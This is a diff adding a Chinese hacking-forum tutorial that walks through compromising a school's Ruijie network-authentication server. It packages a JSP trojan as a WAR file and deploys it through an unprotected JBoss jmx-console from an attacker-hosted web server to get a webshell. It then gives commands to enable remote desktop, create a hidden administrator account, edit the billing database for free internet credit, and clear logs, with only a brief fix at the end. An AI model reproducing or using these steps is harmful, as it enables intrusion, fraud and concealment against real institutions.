@@ -1,0 +1,185 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+路过锐捷认证服务器 感谢willweiwei 感谢鬼仔 没锐捷认证的不用看了
+D8888D主贴内容-------------------------------------------------------
+ 
+
+ [img]http://www.t00ls.net/images/attachicons/rar.gif[/img]收费附件: 检测学校锐捷认证.rar 友情检测锐捷认证服务器
+已经免费 附件是原始版本 和这帖子是一样的 没水印 提高售价 要转的给钱即可 无版权
+
+1所需工具为：HTTP傻瓜服务器V1.0，非官方锐捷拨号客户端MentoHUST，JSP木马并制作war压缩包 WINHEX 。哑巴嗅探器 V3.0 j2sdk-1_4_1_01-windows-i586.rar
+如图1
+
+一 确定认证服务器的地址：
+1如果你知道学校的自助服务的地址的话，也就是查网费的URL。打开默认锐捷拨号软件点开消息如果有如下信息那么你可以跳到二段落：寒假将不统一断网，请校园网用户离校前自行到学校主页—>网络自助服务（[url=http://172.30.1.31:8080/selfservice/index.jsp]链接标记http://172.30.1.31:8080/selfservice/index.jsp[/url]）办理自助暂停！3月1日统一开通（不包括毕业生）您当前使用的服务为internet4,账户余额为19.00元;计算机系
+打开一般是私有地址:8080+ /selfservice 例如我所在的学校即为：[url=http://172.30.1.31:8080/selfservice/index.jsp]链接标记http://172.30.1.31:8080/selfservice/index.jsp[/url]
+2如果你不知道的话 别以为这就失败了看如下确定服务器的方法。
+首先我们要先安装MentoHUST非官方锐捷拨号软件。选择它的原因是如果使用锐捷自带的客户端拨号软件的话有很多限制  解压MentoHUST W2_4.7z后来到你所解压的文件夹 双击安装&卸载.bat 输入1 并回车 如图2 
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004282003190588e769c717f1.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTQ1NHwwZDZmM2FiNHwxMjg2NDgwMDY5fGUzMzMrd0dwNW1Uakl5bGh0d0FTUEtJeTVnUUZicm1GMUVNL0Rxc2hNcDB5a2Nn&nothumb=yes]链接标记下载[/url] (30.8 KB)
+
+2010-4-28 20:03
+  
+启动MentoHUST.exe 如果你以前使用过锐捷的认证客户端的话那么你不用设置了直接认证就可以上网了，如果你没使用过那么点开设置 添加账号密码 并重新认证 如图3 
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004282005c48d41fa7aa3f763.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTQ3MXwzMDdkYTY3ZXwxMjg2NDgwMDY5fGUzMzMrd0dwNW1Uakl5bGh0d0FTUEtJeTVnUUZicm1GMUVNL0Rxc2hNcDB5a2Nn&nothumb=yes]链接标记下载[/url] (37.98 KB)
+
+2010-4-28 20:05
+3 现在我们打开哑巴嗅探器 V3.0 点击设置 如图4  
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004282004ddab6a72bd3f0c20.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTQ1Nnw4NjExMWQzM3wxMjg2NDgwMDY5fGUzMzMrd0dwNW1Uakl5bGh0d0FTUEtJeTVnUUZicm1GMUVNL0Rxc2hNcDB5a2Nn&nothumb=yes]链接标记下载[/url] (1.71 KB)
+
+2010-4-28 20:04
+设置为：① IP包方向及IP过滤设置为：本机收到的IP包
+②        协议过滤勾上TCP，去除UDP,ICMP，其余不变
+
+紧接着关闭所有与网络有关的应用程序QQ等 MentoHUST断开认证不用退出在哑巴嗅探器点击 图5 
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004282004999bb15a889b7ed6.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTQ1N3xlNDAxY2I3OHwxMjg2NDgwMDY5fGUzMzMrd0dwNW1Uakl5bGh0d0FTUEtJeTVnUUZicm1GMUVNL0Rxc2hNcDB5a2Nn&nothumb=yes]链接标记下载[/url] (1.83 KB)
+
+2010-4-28 20:04  
+MentoHUST点击认证 哑巴嗅探器截获如图6 [img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004282004c2416714228ad9f8.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTQ1OHw5NWNmMDdlYnwxMjg2NDgwMDY5fGUzMzMrd0dwNW1Uakl5bGh0d0FTUEtJeTVnUUZicm1GMUVNL0Rxc2hNcDB5a2Nn&nothumb=yes]链接标记下载[/url] (77.9 KB)
+
+2010-4-28 20:04
+
+在实际应用中对比本图的源IP地址、源端口 确定你所在网络的真实地址，我所在网络认证服务器的IP为172.30.1.31。
+我们访问[url=http://172.30.1.31:8080/selfservice/]链接标记http://172.30.1.31:8080/selfservice/[/url] 如图7
+   [img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004282004bdad92cd2ba52487.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTQ1OXxjMGVkMDQ4NXwxMjg2NDgwMDY5fGUzMzMrd0dwNW1Uakl5bGh0d0FTUEtJeTVnUUZicm1GMUVNL0Rxc2hNcDB5a2Nn&nothumb=yes]链接标记下载[/url] (88.99 KB)
+
+2010-4-28 20:04
+
+
+
+二制作war格式的木马  
+1 首先我们需要使用一个JAVA环境的编译软件 
+J2SDK1.4:j2sdk-1_4_1_01-windows-i586.exe 并安装完成我放在默认C盘。
+
+2我们要用到的软件是jar.exe 存放路径为：C:\j2sdk1.4.1_01\bin（我也曾单独提取jar.exe来制作war可是提示缺少组件）创建个文件夹“jbossjdk”（名字为此的意义是让系统管理员不易发现异常 因为等下会在服务器建立同名文件夹 你总不能建立一个“木马”的文件夹吧）并把jbossjdk.jsp放入文件夹中
+3开始-》运行-》cmd 在命令行下输入： cd C:\j2sdk1.4.1_01\bin\jbossjdk  回车
+接着输入：C:\j2sdk1.4.1_01\bin\jar.exe cf jbossjdk.war * 如图8
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004282004e29cd3ac3467a10e.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTQ2MHw4YTlhMWVhZHwxMjg2NDgwMDY5fGUzMzMrd0dwNW1Uakl5bGh0d0FTUEtJeTVnUUZicm1GMUVNL0Rxc2hNcDB5a2Nn&nothumb=yes]链接标记下载[/url] (30.2 KB)
+
+2010-4-28 20:04
+
+
+在C:\j2sdk1.4.1_01\bin\jbossjdk下成功生成jbossjdk.war 如图9
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/10042820040b5a54d9e8c2d514.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTQ2MXwyYWJiNDdkZnwxMjg2NDgwMDY5fGUzMzMrd0dwNW1Uakl5bGh0d0FTUEtJeTVnUUZicm1GMUVNL0Rxc2hNcDB5a2Nn&nothumb=yes]链接标记下载[/url] (11.06 KB)
+
+2010-4-28 20:04
+
+现在这个jbossjdk.war文件  就是一个可以在JSP环境中里去黑锐捷认证的木马了
+
+关于WAR(Web Archive file)网络应用程序文件的百度百科解释：
+是与平台无关的文件格式，它允许将许多文件组合成一个压缩文件。为J2EE 应用程序创建的AR文EAR文件（企业 JAR 文件）war专用在web方面
+
+三 获得webshell
+
+
+如上我已经确定服务器地址为[url=http://172.30.1.31/]链接标记http://172.30.1.31[/url] （这里换成你所知道的服务器地址） 我们输入[url=http://172.30.1.31:8080/jmx-console/]链接标记http://172.30.1.31:8080/jmx-console/[/url] 如果成功访问那么恭喜你成功就在眼前 首先我们在C盘建立个www的文件夹 放入jbossjdk.war 并打开浏览器来到百度首页 保存网页 文件名为：index 然后保存到我们的WWW文件夹里 如图10
+
+
+打开我们的WEB服务器架设工具: http傻瓜.exe 并把服务目录修改为C:\www 然后点击开始服务 如图11
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004282004f815da7e26db0a8e.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTQ2Mnw2YjI5N2MwMHwxMjg2NDgwMDY5fGUzMzMrd0dwNW1Uakl5bGh0d0FTUEtJeTVnUUZicm1GMUVNL0Rxc2hNcDB5a2Nn&nothumb=yes]链接标记下载[/url] (33.32 KB)
+
+2010-4-28 20:04
+
+
+最好清理下浏览器临时文件 在浏览器输入我们的架设的百度页面[url=http://111.187.133.148/index.htm]链接标记http://111.187.133.148/index.htm[/url]  （请把111.187.133.148换成你使用的计算机的IP 如果看到本文的111.187.133.148一概替换为你所使用的IP不再重复） 看是否访问成功 成功的话接着看下一步 不成功的话请检查配置并且关闭杀毒、防火墙，以免端口被屏蔽等带来问题。成功如图12
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004282004f844054fd243996d.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTQ2M3w1OGJkZDhkZHwxMjg2NDgwMDY5fGUzMzMrd0dwNW1Uakl5bGh0d0FTUEtJeTVnUUZicm1GMUVNL0Rxc2hNcDB5a2Nn&nothumb=yes]链接标记下载[/url] (59.33 KB)
+
+2010-4-28 20:04
+
+
+
+我们接着用浏览器打开[url=http://172.30.1.31:8080/jmx-console/]链接标记http://172.30.1.31:8080/jmx-console/[/url] 如图13
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004282004858b9b5c89d1293a.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTQ2NHxmNGIwZmExZnwxMjg2NDgwMDY5fGUzMzMrd0dwNW1Uakl5bGh0d0FTUEtJeTVnUUZicm1GMUVNL0Rxc2hNcDB5a2Nn&nothumb=yes]链接标记下载[/url] (88.64 KB)
+
+2010-4-28 20:04
+
+找jboss.deployment 点击进入flavor=URL,type=DeploymentScanner  来到JMX MBean View页面 找到如图14的函数void addURL() 
+  
+在输入框ParamVal中写入war压缩文件webshell的url地址[url=http://111.187.133.148/jbossjdk.war]链接标记http://111.187.133.148/jbossjdk.war[/url] 如图 14
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004282004db2312dd4022ffc1.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTQ2NXxjZTQyNzlhOHwxMjg2NDgwMDY5fGUzMzMrd0dwNW1Uakl5bGh0d0FTUEtJeTVnUUZicm1GMUVNL0Rxc2hNcDB5a2Nn&nothumb=yes]链接标记下载[/url] (97.89 KB)
+
+2010-4-28 20:04
+点击invoke执行 返回Operation completed successfully without a return value 翻译为：操作成功完成无返回值 。在点击invoke前记得把浏览器的安全级别设置为低 我第一次提交的时候安全级别设置的是中出现提交失败。
+获得webshell
+在浏览器中输入[url=http://172.30.1.31:8080/jbossjdk/jbossjdk.jsp]链接标记http://172.30.1.31:8080/jbossjdk/jbossjdk.jsp[/url] 看到我们的webshell界面 用户名：黑客防线 密码：hacker 点击登陆，如图15
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004282004ff7505bb0c94db0c.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTQ2NnwwNTIyMmJjNnwxMjg2NDgwMDY5fGUzMzMrd0dwNW1Uakl5bGh0d0FTUEtJeTVnUUZicm1GMUVNL0Rxc2hNcDB5a2Nn&nothumb=yes]链接标记下载[/url] (33.07 KB)
+
+2010-4-28 20:04
+
+Shell功能如下 下面提到的命令的执行都是在终端里执行 图16
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004282004ffc0278bce6d9719.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTQ2N3xhZGMwMTU2YnwxMjg2NDgwMDY5fGUzMzMrd0dwNW1Uakl5bGh0d0FTUEtJeTVnUUZicm1GMUVNL0Rxc2hNcDB5a2Nn&nothumb=yes]链接标记下载[/url] (16.59 KB)
+
+2010-4-28 20:04
+
+
+
+
+
+四 远程
+如果你直接使用免杀的木马的话可以跳过四
+如果远程桌面被改端口的话 在SHELL终端输入“tasklist /svc” 执行查找
+svchost.exe                 2912 DcomLaunch, TermService                              //这里TermService就是对应的默认远程桌面服务的PID：2912
+然后使用netstat /ano命令查看对应的端口号
+Proto  Local Address          Foreign Address        State           PID
+TCP    0.0.0.0:4389                  0.0.0.0:0                      LISTENING                      2912      //这里的对应的上面的进程PID号2912，即是远程桌面对应的端口4389.，如果没有的话使用下列命令开3389
+开3389
+2003cmdshell下开启远程桌面服务，用"echo"命令写入一个 3389.reg文件，再"regedit /s 3389.reg"导入注册表文件即可开启。将如下代码一行一行地复制到shell终端后按回车执行：
+
+      echo Windows Registry Editor Version 5.00 >3389.reg 
+　　echo. >>3389.reg 
+　　echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server] >>3389.reg 
+　　echo "fDenyTSConnections"=dword:00000000 >>3389.reg 
+　　echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp] >>3389.reg 
+　　echo "PortNumber"=dword:00000d3d >>3389.reg 
+　　echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp] >>3389.reg 
+　　echo "PortNumber"=dword:00000d3d >>3389.reg 
+将如上代码一行一行地复制到cmdshell窗口后按回车执行
+或者使用我附件的3389.reg 直接上传 执行时执行注意路径"regedit /s 3389.reg"
+建立安全的隐藏帐户
+终端下net user hacker$ hacker /add 回车
+     net localgroup administrators hacker$ /add 在命令行下net user就看不到我们的用户但是这样并没有完全隐藏计算机管理中的本地用户和组，可以查看到我们的隐藏用户
+2、接下来隐藏计算机管理中的本地用户和组 运行regedit，在编辑里查找SAM键（大写的）
+来到这里 如图17
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/10042820042f4ee0ccda6bd3c8.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTQ2OHw0Y2NkZWFhNXwxMjg2NDgwMDY5fGUzMzMrd0dwNW1Uakl5bGh0d0FTUEtJeTVnUUZicm1GMUVNL0Rxc2hNcDB5a2Nn&nothumb=yes]链接标记下载[/url] (29.65 KB)
+
+2010-4-28 20:04
+
+我们单击SAM下
+的SAM右键进行权限设置。如图18
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004282004abda2923cb49aa13.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTQ2OXwxNWMxNzgzZHwxMjg2NDgwMDY5fGUzMzMrd0dwNW1Uakl5bGh0d0FTUEtJeTVnUUZicm1GMUVNL0Rxc2hNcDB5a2Nn&nothumb=yes]链接标记下载[/url] (36.29 KB)
+
+2010-4-28 20:04
+
+设置完权限F5刷新展开即可看到内容 19
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004282004c35d95f571d80171.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTQ3MHwwZGI4OTU3YnwxMjg2NDgwMDY5fGUzMzMrd0dwNW1Uakl5bGh0d0FTUEtJeTVnUUZicm1GMUVNL0Rxc2hNcDB5a2Nn&nothumb=yes]链接标记下载[/url] (68.91 KB)
+
+2010-4-28 20:04
+
+接着我们将用户hacker$删除，并将导出的1.reg和2.reg导入注册表，这样，在本地用户和组管理中就查看不到我们的hacker$用户，但是注册表中拥有，并且这个账户还可以正常登录而且权限不变。
+
+
+数据库操作：
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004282015cbd4f52e25dc9d18.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTQ3Mnw2MzA5OGUyNnwxMjg2NDgwMDY5fGUzMzMrd0dwNW1Uakl5bGh0d0FTUEtJeTVnUUZicm1GMUVNL0Rxc2hNcDB5a2Nn&nothumb=yes]链接标记下载[/url] (112.39 KB)
+
+2010-4-28 20:15
+
+想给自己加网费得话只需改下T_USER表里LEFTTIME、LEFTFEE相应的值。数据库T_ACCTRECORD表里面是上网日志。我是不建议修改为24小时的因为太明显，锐捷后台显示在最上面的都是这种账号危险啊被处分可不是闹着玩的。
+日志清除 图23
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004282004f626aed3430a07e0.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTQ1NXw5MzJlYTNhOXwxMjg2NDgwMDY5fGUzMzMrd0dwNW1Uakl5bGh0d0FTUEtJeTVnUUZicm1GMUVNL0Rxc2hNcDB5a2Nn&nothumb=yes]链接标记下载[/url] (84.42 KB)
+
+2010-4-28 20:04
+
+
+
+临时漏洞修补办法：给jmx-console加上访问密码
+1.在 ${jboss.server.home.dir}/deploy下面找到jmx-console.war目录编辑WEB-INF/web.xml文件 去掉 security-constraint 块的注释，使其起作用
+2.编辑WEB-INF/classes/jmx-console-users.properties或server/default/conf/props/jmx-console-users.properties (version >=4.0.2)和 WEB-INF/classes/jmx-console-roles.properties
+或server/default/conf/props/jmx-console-roles.properties(version >=4.0.2) 添加用户名密码
+3.编辑WEB-INF/jboss-web.xml去掉 security-domain 块的注释 ，security-domain值的映射文件为 login-config.xml （该文件定义了登录授权方式
+
+2003系统下远程桌面服务的一个最关键的注册表键值。在"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" 下数值名称为"fDenyTSConnections"的这一项，可以看到它的数值数据为1或0。数值为1的时候关闭远程桌面服务，数值为0的时候开启远程桌面服务
+ [img]http://www.t00ls.net/images/attachicons/rar.gif[/img][url=http://www.t00ls.net/misc.php?action=attachpay&aid=5339]链接标记检测学校锐捷认证.rar[/url] (1.26 MB) 下载次数:21
+2010-4-22 21:53
+
+售价: 金钱 4  [[url=http://www.t00ls.net/misc.php?action=viewattachpayments&aid=5339]链接标记记录[/url]]  [[url=http://www.t00ls.net/misc.php?action=attachpay&aid=5339]链接标记购买[/url]] 
